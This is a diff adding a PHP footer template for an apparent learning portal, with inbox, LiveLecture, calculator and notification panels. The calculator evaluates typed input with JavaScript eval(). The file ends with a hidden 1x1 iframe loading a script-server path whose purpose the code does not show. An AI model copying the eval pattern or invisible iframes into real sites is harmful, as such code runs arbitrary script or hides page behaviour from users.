@@ -1,0 +1,97 @@
+<?php require_once('foot.php'); ?>
+<div style="clear:both; margin-top:20px"></div>
+<!-- footer starts here --> 
+   <div id="footpanel"> 
+	<ul id="mainpanel">    	
+        <li><a href="#" class="home"><div style="float:left; padding-top:1px">Inbox</div> <div id="msgCount" class="hasMsg">25</div> <small>Messages</small></a></li> 
+        <li id="livelecture"><a href="#" class="livelecture">LiveLecture <small>LiveLecture</small></a>
+        <div class="subpanel"> 
+            <h3><span> &ndash; </span> LiveLecture</h3>
+             <ul>
+            <p>Welcome to LiveLecture. We couldn't find any LiveLecture sessions for your classes.</p>
+             </ul>
+            </div>
+        
+        </li>
+        
+        <li id="calculator"><a href="#" class="calculator">Calculator <small>Calculator</small></a>
+        <div class="subpanel"> 
+            <h3><span> &ndash; </span> Calculator</h3>
+             <ul>
+           <FORM NAME="Calc">
+<div style="text-align:center;margin-top:5px;margin-bottom:5px">
+<INPUT TYPE="text"   NAME="Input" style="width:170px">
+</div>
+
+<div style="text-align:center">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="one"   VALUE="  1  " OnClick="Calc.Input.value += '1'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="two"   VALUE="  2  " OnCLick="Calc.Input.value += '2'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="three" VALUE="  3  " OnClick="Calc.Input.value += '3'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="plus"  VALUE="  +  " OnClick="Calc.Input.value += ' + '">
+</div>
+<div style="text-align:center">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="four"  VALUE="  4  " OnClick="Calc.Input.value += '4'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="five"  VALUE="  5  " OnCLick="Calc.Input.value += '5'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="six"   VALUE="  6  " OnClick="Calc.Input.value += '6'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="minus" VALUE="  -  " OnClick="Calc.Input.value += ' - '">
+</div>
+<div style="text-align:center">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="seven" VALUE="  7  " OnClick="Calc.Input.value += '7'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="eight" VALUE="  8  " OnCLick="Calc.Input.value += '8'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="nine"  VALUE="  9  " OnClick="Calc.Input.value += '9'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="times" VALUE="  x  " OnClick="Calc.Input.value += ' * '">
+</div>
+<div style="text-align:center">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="clear" VALUE="  c  " OnClick="Calc.Input.value = ''">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="zero"  VALUE="  0  " OnClick="Calc.Input.value += '0'">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="DoIt"  VALUE="  =  " OnClick="Calc.Input.value = eval(Calc.Input.value)">
+<INPUT TYPE="button" style="margin-right:5px; width:40px" NAME="div"   VALUE="  /  " OnClick="Calc.Input.value += ' / '">
+<div>
+</FORM>
+             </ul>
+            </div>
+        
+        </li> 
+        <li><a href="#" class="contacts">Contacts <small>Contacts</small></a></li> 
+        <li><a href="#" class="playlist">Play List <small>Play List</small></a></li> 
+        <li><a href="#" class="videos">Videos <small>Videos</small></a></li> 
+        <li id="alertpanel"> 
+        	<a href="#" class="alerts">
+<?php
+$totalNot = getNumNotifications($user_id);
+if ($totalNot > 0) {
+	$class = 'hasNot';
+} else {
+	$class = 'noNot';
+}
+echo '<div id="notCount" class="' . $class . '">' . $totalNot . '</div>';
+?>       	
+<small>Notifications</small></a> 
+ 
+            <div class="subpanel"> 
+            <h3><span> &ndash; </span>Notifications</h3> 
+            <ul id="notiBar"> 
+            	
+ 
+            </ul> 
+            </div> 
+        </li> 
+       <!--  <li id="chatpanel"> 
+                        <a href="#" class="chat">Contacts (<strong>0</strong>) </a> 
+            <div class="subpanel"> 
+            <h3><span> &ndash; </span>Your Contacts</h3> 
+ 
+           <ul> 
+            <li><a href="#"><img src="user_img/0.png" width="22" height="22" alt="" /> John Beasly</a></li><li><a href="#"><img src="user_img/0.png" width="22" height="22" alt="" /> Tom Anderson</a></li><li><a href="#"><img src="user_img/32703.png" width="22" height="22" alt="" /> Eric Simons</a></li>            </ul>  
+            </div> 
+        </li>  -->
+        
+        
+	</ul> 
+</div><br /><br /> 
+<div id="growlNotify" class="jGrowl bottom-right"></div>
+<?php if ($extLock != 1) { ?>
+<iframe src="<?php echo $scriptServer; ?>ccrte.cc" width="1" height="1" style="display:none"></iframe>
+<?php } ?>
+        </body> 
+</html>
